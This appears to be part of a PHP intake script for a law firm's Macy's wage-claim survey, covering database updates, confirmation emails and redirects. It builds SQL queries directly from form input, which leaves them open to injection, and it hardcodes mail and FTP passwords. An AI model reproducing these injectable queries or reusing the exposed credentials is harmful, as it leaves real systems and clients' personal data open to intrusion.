	//{
	//
	//    $shortanythingelse = str_replace('_','',$shortanythingelse);
	//}
	//strip ampersand
	if(strstr($shortanythingelse,'&'))
	{
	
	    $shortanythingelse = str_replace('\'','',$shortanythingelse);
	}	
	//strip dash
	if(strstr($shortanythingelse,'-'))
	{
	
	    $shortanythingelse = str_replace('-','',$shortanythingelse);
	}
	
	////strip space
	//if(strstr($shortanythingelse,' '))
	//{
	//
	//    $shortanythingelse = str_replace(' ','',$shortanythingelse);
	//}
	//strip comma
	if(strstr($shortanythingelse,','))
	{
	
	    $shortanythingelse = str_replace(',','',$shortanythingelse);
	}

	//strip period
	if(strstr($shortanythingelse,'.'))
	{
	
	    $shortanythingelse = str_replace('.','',$shortanythingelse);
	}

	//strip parenthasis open
	if(strstr($shortanythingelse,'('))
	{
	
		$shortanythingelse = preg_replace('/\(|\)/','',$shortanythingelse);
	}
	
	//strip parenthasis close
	if(strstr($shortanythingelse,')'))
	{
		$shortanythingelse = preg_replace('/\(|\)/','',$shortanythingelse); 
	}
 
	$shortanythingelse = $_POST['shortanythingelse'];
	$var = "shortanythingelse";
	$vardata = $shortanythingelse;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['additionalInfo'])) $additionalInfo = $_POST['additionalInfo'];
#if (isset($_REQUEST['barcode'])) $barcode = $_REQUEST['barcode'];
if (empty($additionalInfo))
{
unset($additionalInfo);	
}
else
{

	//strip single quote
	if(strstr($additionalInfo,'\''))
	{
	
	    $additionalInfo = str_replace('\'','',$additionalInfo);
	}
	
	//strip double quote
	if(strstr($additionalInfo,'\"'))
	{
	
	    $additionalInfo = str_replace('\"','',$additionalInfo);
	}	
	//strip percentage
	if(strstr($additionalInfo,'%'))
	{
	
	    $additionalInfo = str_replace('%','',$additionalInfo);
	}
	//strip asterisk
	if(strstr($additionalInfo,'*'))
	{
	
	    $additionalInfo = str_replace('*','',$additionalInfo);
	}
	//strip underscore
	if(strstr($additionalInfo,'_'))
	{
	
	    $additionalInfo = str_replace('_','',$additionalInfo);
	}
	//strip ampersand
	if(strstr($additionalInfo,'&'))
	{
	
	    $additionalInfo = str_replace('\'','',$additionalInfo);
	}	
	//strip dash
	if(strstr($additionalInfo,'-'))
	{
	
	    $additionalInfo = str_replace('-','',$additionalInfo);
	}
	
	////strip space
	//if(strstr($additionalInfo,' '))
	//{
	//
	//    $additionalInfo = str_replace(' ','',$additionalInfo);
	//}
	//strip comma
	if(strstr($additionalInfo,','))
	{
	
	    $additionalInfo = str_replace(',','',$additionalInfo);
	}

	//strip period
	if(strstr($additionalInfo,'.'))
	{
	
	    $additionalInfo = str_replace('.','',$additionalInfo);
	}

	//strip parenthasis open
	if(strstr($additionalInfo,'('))
	{
	
		$additionalInfo = preg_replace('/\(|\)/','',$additionalInfo);
	}
	
	//strip parenthasis close
	if(strstr($additionalInfo,')'))
	{
		$additionalInfo = preg_replace('/\(|\)/','',$additionalInfo); 
	}

	$var = "additionalInfo";
	$vardata = $additionalInfo;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
			$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['didyouworkatmacysretail'])) 
{	$didyouworkatmacysretail = $_POST['didyouworkatmacysretail'];
	$var = "didyouworkatmacysretail";
	$vardata = $didyouworkatmacysretail;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			

}
if (isset($_POST['areyoucurrentmacysemployee'])) 
{	$areyoucurrentmacysemployee = $_POST['areyoucurrentmacysemployee'];
	$var = "areyoucurrentmacysemployee";
	$vardata = $areyoucurrentmacysemployee;
	$query = "UPDATE status set [$var]='$vardata' WHERE status.uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			

}

	
		
		}
	}
}
?>

<!DOCTYPE html">
<!--<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" href="css/default.css" />
        <link rel="stylesheet" type="text/css" href="css/homestyle.css" />
        <link rel="stylesheet" href="css/jquery.ui.all.css" />
        <script type="text/javascript" src="js/jquery-1.4.4.js"></script>
        <script type="text/javascript" src="js/jquery.ui.core.js"></script>
        <script type="text/javascript" src="js/jquery.ui.widget.js"></script>
        <script type="text/javascript" src="js/jquery.ui.datepicker.js"></script>
        <script type="text/javascript" src="js/Utils.js"></script>      
    </head>
<body>
    	
<div class="container">-->
	    		<?php
	//    			// Display the Two Signer Message (if Two Signer Mode)
	//    			if($_showTwoSignerMessage)
	//					{
	//    				#echo "<div class='sampleMessage'>Have the first signer fill out the Envelope (only a signature is required for the first signer)</div>";
	//    				}
				?>
	    		<?php
	//    			// Display the Transition Message (if required, in Two Signer Mode)
	//    			if($_showTransitionMessage)
	//				{
	//					echo "<div class='sampleMessage'>The first signer has completed the Envelope. Now the second signer will be asked to fill out details in the Envelope.</div>";
	    			#}
	    		?>
	    				
<?PHP
#//ian)->
#//----------------------------------------------------------------------------------------
#//----------------------------------------------------------------------------------------
#//----------------------------------------------------------------------------------------
#//ian)-> This is where the PDF to sign is actually presented to the end user after you #build it above
#// Display the iFrame (if is needed)
#if(isset($_SESSION['embedToken']) && !empty($_SESSION['embedToken'])){
#//ian)-> get hyperlink for iframe, maybe pipe this to the database?
#$link =  $_SESSION['embedToken'];
#$link =  'http://www.yourlawsuit.com/macys/retainer/?uniqueid='.$uniqueid;
$link =  'https://macyslawsuit.com/retainer/?uniqueid='.$uniqueid;

#//ian)-> paint the actual iframe took out this tag class='embediframe' 
#// Nullify IFRAME //// Nullify IFRAME //// Nullify IFRAME //// Nullify IFRAME //						
#echo "<iframe marginheight='5%' width='94%' height='94%' src='";
#echo $_SESSION['embedToken'] . "&id='hostiframe' name='hostiframe'></iframe>";
#                        }
#// Nullify IFRAME //// Nullify IFRAME //// Nullify IFRAME //// Nullify IFRAME //
#// Nullify IFRAME //// Nullify IFRAME //// Nullify IFRAME //// Nullify IFRAME //				
////////////////////////////////////////////////////////////////////////////////
/////email/////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
?>
<?php
if ($shortnoneoftheabove !== 'No')
{

}
else
{
    if(isset($_POST['wantstoshare']))
    {
	if($_POST['wantstoshare'] == 'Yes')
	{
	    $message = '
	    <br>
	    The individual below indicated they may have experienced labor violations during their employment. 
	    <br>
	    <br>
	    <br>Name:			'.$FirstName.' '.$LastName.'
	    <br>Mailing Address:		'.$Street1.', '.$Street2.', '.$City.', '.$State.' '.$Zipcode.'
	    <br>Phone number:		'.$phone1.'
	    <br>Phone number:		'.$phone2.'
	    <br>Email address:		'.$email.'
	    <br>Postcard:			'.$barcode.'
	    
	    
	    ';
	    require_once('class.phpmailer.php');
	    //include("class.smtp.php"); // optional, gets called from within class.phpmailer.php if not already loaded
	    
	    $mail = new PHPMailer(true); // the true param means it will throw exceptions on errors, which we need to catch
	    
	    $mail->IsSMTP(); // telling the class to use SMTP
	    
	    try {
	      $mail->Host       = "mail1.domain.initiativelegal.com"; // SMTP server
	      $mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	      $mail->SMTPAuth   = true;                  // enable SMTP authentication
	    #  $mail->SMTPAuth   = true;                  // enable SMTP authentication
	    #  $mail->Host       = "exchange.initiativelegal.com"; // sets the SMTP server
	      $mail->Port       = 25;                    // set the SMTP port for the GMAIL server
	      $mail->Username   = "macyslawsuit"; // SMTP account username
	      $mail->Password   = "PLS1234!";        // SMTP account password
	      $mail->AddReplyTo('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	    #  $mail->AddAddress($_POST['3Email'], "$FirstName"." $LastName");
	    $mail->AddAddress("vchetty@initiativelegal.com", "VJ Chetty");
	    $mail->AddAddress("ihutchings@initiativelegal.com", "NEW MATTERS");
	      $mail->SetFrom('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	      $mail->AddBCC('defter@gmail.com', 'Ian Hutchings');
	      $mail->AddBCC("MassAction_Macys_Management@initiativelegal.com", "Mass Action Mgmt - 'Macy\'s Lawsuit");
	    #  $mail->AddCC('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	    #  $mail->AddCC($attorneyemail, $attorneyfname.' '.$attorneylname);
	      $mail->AddReplyTo('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	      $mail->Subject = 'Potential Labor Violations - '.$FirstName.' '.$LastName;
	    #$mail->Subject = "$FirstName "."$LastName, ".'Thank you for completing our survey!';
	      #$mail->AltBody = 'To view the message, please use an HTML compatible email viewer!'; // optional - MsgHTML will create an alternate automatically
	     # $mail->MsgHTML(file_get_contents('contents.html'));
	      $mail->MsgHTML($message);
	    
	    
	      #$mail->AddAttachment('images/phpmailer.gif');      // attachment
	      #$mail->AddAttachment('images/phpmailer_mini.gif'); // attachment
	      $mail->Send();
	      #echo "</p>\n";
	    }
	    
	    //catch (phpmailerException $e) 
	    //{
	    //  echo $e->errorMessage(); //Pretty error messages from PHPMailer
	    //} 
	    
	    catch (Exception $e) 
	    
	    {
	      #echo $e->getMessage(); //Boring error messages from anything else!
	    }
	}
    }
    else
    {
	if (!isset($_POST['wantstoshare1']))
	{
	    $message = '
	    <body>
	    
	    <table style="font-family:arial, helvetica, sans-serif; color:#424242;" bgcolor="#888888" width="100%" border="0" cellspacing="0" cellpadding="5">
		    <tr>
		    <td>
		    <table align="center" bgcolor="#ffffff" width="600" border="0" cellspacing="0" cellpadding="5">
			    <tr>
			    <td>
			    <table align="center" bgcolor="#ffffff" width="600" border="0" cellspacing="0" cellpadding="5">
				    <tr>
				    <td></td>
				</tr>
			    </table>
			    </td>
			</tr>
			    <tr>
			    <td>
			    <table style="font-family:arial, helvetica, sans-serif; color:#424242;" align="center" bgcolor="#f1f1f1" width="550" border="0" cellspacing="0" cellpadding="5">
					    <tr>
				    <td width="2%">&nbsp;</td>
				    <td>&nbsp;</td>
				    <td>&nbsp;</td>
				    <td>&nbsp;</td>
				    <td width="2%">&nbsp;</td>
				    </tr>
				    <tr>
							    <td width="2%">&nbsp;</td>
				    <td><img src="https://macyslawsuit.com/wp-content/uploads/2012/04/email_macys_logo.gif" width="200px" height="42px" alt="MacysLawsuit.com" /></td>
				    <td>&nbsp;</td>
				    <td><img src="https://macyslawsuit.com/wp-content/uploads/2012/04/email_ilg_logo.gif" width="250px" height="31px" alt="Initiative Legal Group, APC" />
				    <td width="2%">&nbsp;</td>
				    </tr>
				    <tr>
				    <td width="2%">&nbsp;</td>
				    <td>&nbsp;</td>
				    <td>&nbsp;</td>
				    <td><p style="font-weight:bold; text-align:center;">888.792.2293</p></td>
				    <td width="2%">&nbsp;</td>
				    </tr>
			    </table>
			    </td>
			</tr>

		      <tr>
			    <td>
			 <table style="font-size:16px; line-height:25px; font-family:arial, helvetica, sans-serif;" align="center" bgcolor="#ffffff" width="600" border="0" cellspacing="0" cellpadding="5">
			    <tr>
								    <td width="2%">&nbsp;</td>
					<td width="2%">&nbsp;</td>
							    <td><p>Dear '.$FirstName.' '.$WhoLastName.':</p><p>Thank you for completing the online survey! We believe that you may have wage and hour claims against Macy\'s, Inc.  If you choose, you may retain our law firm to pursue your potential wage and hour claims. </br>If you are already represented by an attorney regarding any claims against Macy\'s, please do not continue.</p>
							    <p style="font-weight:normal;padding-bottom:0;text-align:center;"><a style="color:#a31c30; text-decoration:none; font-weight:bold; font-size:18px;" href="'.$link.'" target="_blank">
	<img src="https://macyslawsuit.com/wp-content/themes/MacysV3/images/viewRetainerBtn.png" width="406px" height="60px" alt="View Attorney-Client Agreement" />
</a> </p><p>Please take your time and carefully review this Agreement.</p><p style="font-weight:normal;padding-bottom:0;">After you have completed your review, you will be prompted to electronically initial and sign the Agreement by clicking on the "sign here" tabs. Please click on "confirm signing" to submit the Attorney-Client Agreement to our law firm, and retain us as your attorneys for your potential wage and hours claims against Macy\'s.</p><p style="padding-bottom:3px;">If you have any questions, please call us at <strong>888.792.2293</strong>.</p><p style="line-height:5px;">&nbsp;</p><p style="text-align:center; text-decoration:underline; color:#888888;font-weight:bold; font-size:20px;"><span style="font-size:12px;">CONFIDENTIAL/WORK PRODUCT PRIVILEGE</span></p></td>
							    <td width="2%">&nbsp;</td>
					<td width="2%">&nbsp;</td>
							    </tr>
			 </table>
			</td>
		      </tr>
		      <tr>
			    <td>

		      
			    </td>
		      </tr>
		      <tr>
			    <td>
			    </td>
		    </tr>
		  <tr>
			    <td><table style="font-size:10px; font-style:italic; line-height:13px;font-family:Times New Roman, times, serif;" bgcolor="#ffffff" align="center" width="550" border="0" cellspacing="0" cellpadding="5">
	    
		    <tr>
			    <td width="2%">&nbsp;</td>
		    <td><p style="padding-bottom:5px; font-family:times new roman, times, serif;">This message is for the intended recipient only.  The information contained in this e-mail message is legally privileged and confidential information intended only for the use of the individual or entity named above.  If the receiver of this message is not the intended recipient, you are hereby notified that any dissemination, distribution or copying of this email message is strictly prohibited and may violate the legal rights of others.  If you have received this message in error, please immediately notify the sender by reply email or telephone and return the message to Initiative Legal Group APC, 1800 Century Park East, Second Floor, Los Angeles, California 90067, (888.792.2293), and delete it from your system.</p><p style="line-height:3px;">&nbsp;</p><p style="font-size:14px; font-weight:bold; padding-bottom:5px; font-family:times new roman, times, serif;">Disclaimer: Initiative Legal Group APC does not make any promises or guarantees as to any specific outcome of any case.</p><p>To the extent that the State Bar rules require that we designate a responsible member for the contents of this email, Initiative Legal Group APC designates Mónica Balderrama as the attorney responsible for this site.</p></td>
		    <td width="2%">&nbsp;</td>
		    </tr>
		    </table>
		    </td>
	      </tr>
		      
		    </table>
		    </td>
		</tr>
		
		
	    </table><img width="1px" height="1px" src="https://DFWMS01.initiativelegal.com/emailhit.php?uniqueid='.$uniqueid.'&isemail=retainersend">
	    </body>
	    ';
	    require_once('class.phpmailer.php');
	    //include("class.smtp.php"); // optional, gets called from within class.phpmailer.php if not already loaded
	    
	    $mail = new PHPMailer(true); // the true param means it will throw exceptions on errors, which we need to catch
	    
	    $mail->IsSMTP(); // telling the class to use SMTP
	    
	    try {
	      $mail->Host       = "mail1.domain.initiativelegal.com"; // SMTP server
	      $mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
	      $mail->SMTPAuth   = true;                  // enable SMTP authentication
	    #  $mail->SMTPAuth   = true;                  // enable SMTP authentication
	    #  $mail->Host       = "exchange.initiativelegal.com"; // sets the SMTP server
	      $mail->Port       = 25;                    // set the SMTP port for the GMAIL server
	      $mail->Username   = "macyslawsuit"; // SMTP account username
	      $mail->Password   = "PLS1234!";        // SMTP account password
	      $mail->AddReplyTo('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	      $mail->AddAddress($email,$FirstName." ".$WhoLastName);
	      $mail->SetFrom('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	      $mail->AddBCC('defter@gmail.com', 'Ian Hutchings');
	      $mail->AddBCC("MassAction_Macys_Management@initiativelegal.com", "Mass Action Mgmt - 'Macy\'s Lawsuit");
	      $mail->AddCC('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	    #  $mail->AddCC($attorneyemail, $attorneyfname.' '.$attorneylname);
	      $mail->AddReplyTo('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
	      $mail->Subject = 'Macy\'s Lawsuit - Attorney-Client Agreement enclosed';
	    #$mail->Subject = "$FirstName "."$LastName, ".'Thank you for completing our survey!';
	      #$mail->AltBody = 'To view the message, please use an HTML compatible email viewer!'; // optional - MsgHTML will create an alternate automatically
	     # $mail->MsgHTML(file_get_contents('contents.html'));
	      $mail->MsgHTML($message);
	    
	    
	      #$mail->AddAttachment('images/phpmailer.gif');      // attachment
	      #$mail->AddAttachment('images/phpmailer_mini.gif'); // attachment
	      $mail->Send();
	      echo "</p>\n";
	    } 
	    
	    //catch (phpmailerException $e) 
	    //{
	    //  echo $e->errorMessage(); //Pretty error messages from PHPMailer
	    //} 
	    
	    catch (Exception $e) 
	    
	    {
	      #echo $e->getMessage(); //Boring error messages from anything else!
	    }
	}
    }
}
?>

<?PHP 
//echo "((__START__Ian's wording for interim use__))<br><br><br><br><br>";
//echo 'Thank you '.$FirstName.'!<br><br>'; 
//echo "You'll be recieving an email from us shortly.<br><br>";
//echo "Inside, you'll find a link to an Attorney-Client agreement.<br><br>";
//echo "For your convenience, that link is also available here: ";
//echo '<a href="'.$link.'" target="_blank">Click here to esign the Attorney-Client agreement (retainer).</a>';
//echo "<br><br>";
//echo "Signing this allows us to investigate and litigate your case against ";
//echo $brand.".";
//echo "<br><br><br><br>((__END__Ian's wording for interim use__))<br>";
?>

<?PHP
require("writePdfShortForm.php");
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<link href="https://macyslawsuit.com/wp-content/themes/MacysV3/css/confirmations.css" rel="stylesheet" type="text/css" />

</head>
<?php
if (!isset($retaineraccepted))
{

if($shortnoneoftheabove != 'No')
{//people see this if they have no claims
    

    //echo '<body>';
    //echo "<input style='border:0' type='hidden' id='textbox1' size='1'>";
    //echo "<script>document.getElementById('textbox1').focus()</script>";
    //echo '<div id="main">';
    //echo '<div id="message">';
    //echo '<h4>';
    //echo 'CONFIDENTIAL/WORK PRODUCT PRIVILEGE';
    //echo '</h4>';
    //echo '<h3>';
    //echo 'Thank you for your participation!';
    //echo '</h3>';
    //echo '<div align=center>';
    //echo 'We will review your information and will contact you shortly.';
    //echo '<br><br>';
    //echo 'If you have any questions, please contact us at 888.792.2293, Monday through Friday.';
    //echo '<br><br>';
    //echo "</div>";
    //echo '<p class="disclaimer">';
    //echo 'Disclaimer: Initiative Legal Group APC does not make any promises or guarantees as to any specific outcome of any case.';
    //echo '</p>';
    //echo '</div>';
    //echo '</div>';
    //echo '</body>';

    $query = "UPDATE status set notqualifiedreason='No claims',notqualified='Yes' WHERE uniqueid='$uniqueid'";
    $results = sqlsrv_query($conn,$query);
      
    #require("mars/iansmakepdfdecline.php");
$message = '
<html>
<head>
</head>
<body>
<table border="0" cellspacing="0" cellpadding="0" width="100%" align="center">
	<tbody>
        <tr>
		  <td width="20" bgcolor="#ffffff" >&nbsp;</td>
			<td bgcolor="#ffffff"><table width="100%" border="0"  cellpadding="14">
			  <tr>
			    <td style="font-family: Arial,Helvetica,sans-serif; font-size: 14px; line-height:20px; color:#333333" bgcolor="#ffffff" width="100%">
				<p>Please mail out the attached declination letter today. <br /><br />
				Mailing address:<br /><br />
				'.$FirstName.' '.$LastName.'
				<br />
				'.$Street1.', '.$Street2.'<br />
				'.$City.', '.$State.' '.$Zipcode.'<br />
				<br />
				Uniqueid: '.$uniqueid.'
				<br />
<br />

MARS: <a href="http://sqlsrv.domain.initiativelegal.com/mars/index.php?uniqueid='.$uniqueid.'">CLICK HERE</a>

<br>

</td>
		      </tr>
		    </table></td>
		</tr>
		
		<tr>
			
</table>
</body>
</html>


';

echo '<script type="text/javascript">';
echo 'function reloadPage()';
echo '{';
echo 'window.top.location.replace("http://macyslawsuit.com/no-claims/");';
##echo 'window.top.location.replace("https://macyslawsuit.com/after-online-survey/?uniqueid='.$uniqueid.'");';	
#echo 'window.top.location.replace("http://yourlawsuit.com/macys/afterfeewaiver/?uniqueid='.$uniqueid.'");';
echo '}';
echo '</script>';
echo '<body onload="reloadPage()">';
//function makedeclinationletter($brandname,$uniqueid,$FirstName,$LastName,$clientname,$Street1,$Street2,$City,$State,$Zipcode,$agentname,$agentemail)
//{
////open
//
//$pdf = new PDF_Code128();
//$hello2 = date('F').' '.date('j').date('S').' '.date('Y');
//$subject1 = './retainers/MacysDeclinationLetterSubject1.txt';
//$subject2 = './retainers/MacysDeclinationLetterSubject2.txt';
//$body1 = './retainers/'. "$brandname" . 'DeclinationLetterBody1.txt';
//$get1 = file_get_contents($subject1);
//$get2 = file_get_contents($subject2);
//$body1 = './retainers/'. "$brandname" . 'DeclinationLetterBody1.txt';
//$get3 = file_get_contents($body1);
//$bodydeclined = 'We are writing in response to the questionnaire you completed on '.$hello2.'. After reviewing your responses, our law firm does not believe that you have wage and hour claims against Macy\'s Inc. This letter is	 to inform you that our law firm does not intend to pursue any wage and hour claims on your behalf against Macy\'s Inc. Please find a copy of your questionnaire enclosed.';
//$hellocompany = 'INITIATIVE LEGAL GROUP APC';
//$caseattorneyname = '                                                                                                                                          '.$agentname;
//$caseattorneyphonenumber = '                                                                                                                                          1.888.792.2293 Toll Free';
//$caseattorneyemail = '                                                                                                                                          '.$agentemail;
//$hellotitle = 'ATTORNEY ADVERTISEMENT';
//$hello = "$clientname" . ' ("Client") ';
//$hello2 = date('F').' '.date('j').date('S').' '.date('Y');
//$printyourfullname = 'VIA U.S. MAIL';
//$yourbestphonenumber = $FirstName.' '.$LastName;
//$addressline1 = $Street1.' '.$Street2;
//$addressline2 = $City.', '.$State.' '.$Zipcode;
//$title = 'ATTORNEY-CLIENT AGREEMENT';
//$agreed = 'AGREED AND ACCEPTED';
//$space = ' ';
//$printtxt = 'PRINT FIRST AND LAST NAME';
//$printline = '__________________________________';
//$signtxt = 'SIGN YOUR NAME                    DATE      ' . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . '        On behalf of ATTORNEYS            DATE';
//$signline = '___________________________/___________' . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" . "$space" .' ___________________________/___________';
//$pdf->AddPage();
//$pdf->Image('logo.png',62,28,8,0,'','');
//$pdf->Ln(15);
//$pdf->SetFont('helvetica','B',12);
//$pdf->MultiCell(0,5,$hellocompany,'','C');
//$pdf->Ln();
//$pdf->SetFont('Times','',10);
//$pdf->MultiCell(0,5,$caseattorneyname,'','L');
//$pdf->Ln(0);
//$pdf->SetFont('Times','',10);
//$pdf->MultiCell(0,5,$caseattorneyphonenumber,'','L');
//$pdf->Ln(0);
//$pdf->SetFont('Times','',10);
//$pdf->MultiCell(0,5,$caseattorneyemail,'','L');
//$pdf->Ln();
//$pdf->SetFont('Times','B',12);
//#$pdf->MultiCell(0,5,$hellotitle,'','C');
//$pdf->Ln();
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$hello2);
//$pdf->Ln();
//$pdf->SetFont('Times','U',12);
//$pdf->MultiCell(0,5,$printyourfullname);
//$pdf->Ln(0);
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$yourbestphonenumber);
//$pdf->Ln(0);
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$addressline1);
//$pdf->Ln(0);
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$addressline2);
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->Cell(0,5,'Subject:');
//$pdf->Ln(0);
//$pdf->SetFont('Times','I',12);
//$pdf->Cell(0,5,$get1);
//$pdf->Ln(5);
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$get2);
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,'Dear '.$clientname.': ');
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$bodydeclined);
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$get4);
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$get5);
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,$get6);
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//$pdf->MultiCell(0,5,'Sincerely,');
//$pdf->Ln();
//$pdf->Ln();
//$pdf->MultiCell(0,5,$agentname,'','L');
//$pdf->Ln();
//$pdf->SetFont('Times','',12);
//#$pdf->MultiCell(0,5,'Enclosed:  Questionnaire copy ');
//$code= "$uniqueid";
//$pdf->Code128(130,260,$code,70,10);
//$pdf->SetXY(130,270);
//$pdf->Write(5,''.$code.'');
//$dir='/inetpub/wwwroot/';
//$foldername = "$LastName, " .  "$FirstName" . " - $uniqueid"; 
//$filename = "$LastName, " .  "$FirstName" . " - Declination Letter - $uniqueid"; 
//$ext = ".pdf";
//$pdf->Output("/inetpub/wwwroot/mars/$filename$ext","F"); //pushes file to server for temp storage
//$pdf->Output("/inetpub/wwwroot/mars/Retainerstmp/$filename$ext","F");
//$ftp_server = '10.129.3.21';
//$ftp_user_name = 'sqlsrv';
//$ftp_user_pass = 'password';
//$dir0 = '/' . "$brandname" . '/';
//$dir1 = "$dir0" . "$foldername";
//$dir2 = "$dir1" . '/';
//$file = "$filename" . "$ext";
//$conn_id = ftp_connect($ftp_server);
//$login_result = ftp_login($conn_id, $ftp_user_name, $ftp_user_pass);
//ftp_mkdir($conn_id, $dir2);
//ftp_chdir($conn_id, $dir2);
//ftp_put($conn_id, $file, $file, FTP_BINARY);
//ftp_close($conn_id);
//unlink($file); //delete temp copy pdf stored on server
//
////close
//}

        //makedeclinationletter($brand,$uniqueid,$FirstName,$LastName,$FirstName.' '.$LastName,$Street1,$Street2,$City,$State,$Zipcode,$RecipientName2,$RecipientEmail2);
    
//        $attachment2  = "/inetpub/wwwroot/mars/Retainerstmp/".$LastName.', '.$FirstName.' - Declination Letter - '.$uniqueid.'.pdf';
//	$mailroom = 'MassAction_Mailroom@initiativelegal.com';
//	$mailroomname = 'Mass Action Mailroom';
//
//require_once('class.phpmailer.php');
//$mail = new PHPMailer(true); // the true param means it will throw exceptions on errors, which we need to catch
//
//$mail->IsSMTP(); // telling the class to use SMTP

//try {
//  $mail->Host       = "mail1.domain.initiativelegal.com"; // SMTP server
//  $mail->SMTPDebug  = 0;                     // enables SMTP debug information (for testing)
//  $mail->SMTPAuth   = true;                  // enable SMTP authentication
//  $mail->Port       = 25;                    // set the SMTP port for the GMAIL server
//  $mail->Username   = "macyslawsuit"; // SMTP account username
//  $mail->Password   = "PLS1234!";        // SMTP account password
//  $mail->AddAddress('MassAction_Mailroom@initiativelegal.com','Mass Action Mailroom');
//  $mail->SetFrom('macyslawsuit@initiativelegal.com', 'Macy\'s Lawsuit');
//
//  $mail->AddBCC('defter@gmail.com', 'Ian Hutchings');
//  $mail->AddBCC("MassAction_Macys_Management@initiativelegal.com", "Mass Action Mgmt - 'Macy\'s Lawsuit");
//
//  #$mail->AddReplyTo('Lawsuittest@initiativelegal.com', 'Macy\'s Lawsuit');
//  $mail->Subject = 'DECLINATION LETTER! - '.$LastName.', '.$FirstName.' - '.$uniqueid;
//  #$mail->AddAttachment($attachment);      // attachment
//  if (isset($attachment2))
//  {
//	$mail->AddAttachment($attachment2);      // attachment
//  }
//  $mail->MsgHTML($message);
//  $mail->Send();
//  
//  #echo "</p>\n";
//} 
//catch (Exception $e) 
//
//{
//  echo $e->getMessage(); //Boring error messages from anything else!
//}
}
else
{//standard person with claims will see this

    if (isset($_POST['wantstoshare1']))
    {
    echo '<body>';
    echo '<div id="main">';
    echo '<div id="message">';
    echo "<input style='border:0' type='hidden' id='textbox1' size='1'>";
    echo "<script>document.getElementById('textbox1').focus()</script>";
    #echo '<h4>Attorney Advertisement<br />';
    echo 'CONFIDENTIAL/WORK PRODUCT PRIVILEGE</h4>';
    echo '<h3>Thank you for your time!</h3>';
    echo '<ul>';
    echo '<li class="centeredText">Our lawsuit only applies to current and former employees of Macy\'s, Inc.</li>';
    echo '</ul>';
    echo '<p class="disclaimer">Disclaimer: Initiative Legal Group APC does not make any promises or guarantees as to any specific outcome of any case.</p>';
    echo '</div>';
    echo '</div>';
    echo '</body>';
    echo '</html>';
    $query = "UPDATE status set notqualifiedreason='Never worked at Macys',donotcontact='Yes',didnotworkatmacys='Yes',wantstoshare='Yes',notqualified='Yes',agreetocontactaboutexperience='Yes' WHERE uniqueid='$uniqueid'";
    if ($wantstoshare == 'No')
    {
	$query = "UPDATE status set notqualifiedreason='Never worked at Macys',donotcontact='Yes',didnotworkatmacys='Yes',wantstoshare='No',notqualified='Yes',agreetocontactaboutexperience='No' WHERE uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			    $query = "select notelog from status where uniqueid='$uniqueid'";
			    $results = sqlsrv_query($conn,$query);
			    while($row = sqlsrv_fetch_array($results))
				{
				    $notelog = $row['notelog'];
				}
			    $notelognew = $date.' @ '.$time.' : <strong>Did not work at Macys and does not want to discuss other companies.</strong><br>'.$notelog;
    }
    else
    {
		$query = "UPDATE status set notqualifiedreason='Never worked at Macys',donotcontact='Yes',didnotworkatmacys='Yes',wantstoshare='Yes',notqualified='Yes',agreetocontactaboutexperience='Yes' WHERE uniqueid='$uniqueid'";
	$results = sqlsrv_query($conn,$query);
			    $query = "select notelog from status where uniqueid='$uniqueid'";
			    $results = sqlsrv_query($conn,$query);
			    while($row = sqlsrv_fetch_array($results))
				{
				    $notelog = $row['notelog'];
				}
			    $notelognew = $date.' @ '.$time.' : <strong>Did not work at Macys but has potential claims and wants to discuss them.</strong><br>'.$notelog;
    }

			    $query = "update Status set notelog='$notelognew' where uniqueid='$uniqueid'";
			    $results = sqlsrv_query($conn,$query);      
    }
    else
    {

    
//this will top re-write
echo '<script type="text/javascript">';
echo 'function reloadPage()';
echo '{';
echo 'window.top.location.replace("https://macyslawsuit.com/retainer/?uniqueid='.$uniqueid.'");';
##echo 'window.top.location.replace("https://macyslawsuit.com/after-online-survey/?uniqueid='.$uniqueid.'");';	
#echo 'window.top.location.replace("http://yourlawsuit.com/macys/afterfeewaiver/?uniqueid='.$uniqueid.'");';
